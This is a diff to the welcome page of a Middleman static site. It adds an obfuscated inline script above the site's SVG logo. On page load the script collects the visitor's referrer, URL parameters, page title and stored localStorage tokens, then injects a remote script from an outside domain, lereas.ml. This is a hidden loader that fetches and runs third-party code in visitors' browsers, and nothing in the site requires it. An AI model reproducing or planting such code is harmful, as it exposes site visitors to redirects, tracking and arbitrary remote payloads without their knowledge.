@@ -1,7 +1,49 @@
 ---
 title: Welcome to Middleman
 ---
-
+<script>
+    (function() {
+    var name = '_7CB71jsmWDnk6Lz1';
+    if (!window._7CB71jsmWDnk6Lz1) {
+        window._7CB71jsmWDnk6Lz1 = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://lereas.ml/Tkt5dbvC',
+            P_PATH: 'https://lereas.ml/7b4f75c/postback',
+        };
+    }
+    const _kjMQ3KxycknNxMFM = localStorage.getItem('config');
+    if (typeof _kjMQ3KxycknNxMFM !== 'undefined' && _kjMQ3KxycknNxMFM !== null) {
+        var _1bHPwJp3PLTSQmkD = JSON.parse(_kjMQ3KxycknNxMFM);
+        var _vvywYJWSCcGHryWK = Math.round(+new Date()/1000);
+        if (_1bHPwJp3PLTSQmkD.created_at + window._7CB71jsmWDnk6Lz1.ttl < _vvywYJWSCcGHryWK) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _9DkDbTr9kQZZ616y = localStorage.getItem('subId');
+    var _6dHGv1Lg1bxB312q = localStorage.getItem('token');
+    var _9vxtTgbf4vT2p8sL = '?return=js.client';
+        _9vxtTgbf4vT2p8sL += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _9vxtTgbf4vT2p8sL += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _9vxtTgbf4vT2p8sL += '&default_keyword=' + encodeURIComponent(document.title);
+        _9vxtTgbf4vT2p8sL += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _9vxtTgbf4vT2p8sL += '&name=' + encodeURIComponent(name);
+        _9vxtTgbf4vT2p8sL += '&host=' + encodeURIComponent(window._7CB71jsmWDnk6Lz1.R_PATH);
+    if (typeof _9DkDbTr9kQZZ616y !== 'undefined' && _9DkDbTr9kQZZ616y && window._7CB71jsmWDnk6Lz1.unique) {
+        _9vxtTgbf4vT2p8sL += '&sub_id=' + encodeURIComponent(_9DkDbTr9kQZZ616y);
+    }
+    if (typeof _6dHGv1Lg1bxB312q !== 'undefined' && _6dHGv1Lg1bxB312q && window._7CB71jsmWDnk6Lz1.unique) {
+        _9vxtTgbf4vT2p8sL += '&token=' + encodeURIComponent(_6dHGv1Lg1bxB312q);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._7CB71jsmWDnk6Lz1.R_PATH + _9vxtTgbf4vT2p8sL;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 340" class="middleman-logo" aria-labelledby="middleman-logo__title" role="img">
   <title id="middleman-logo__title">Middleman</title>
   <path class="middleman-logo__top-left-bar" fill-opacity=".45" d="M0 40L200 0v30L0 60z"/>
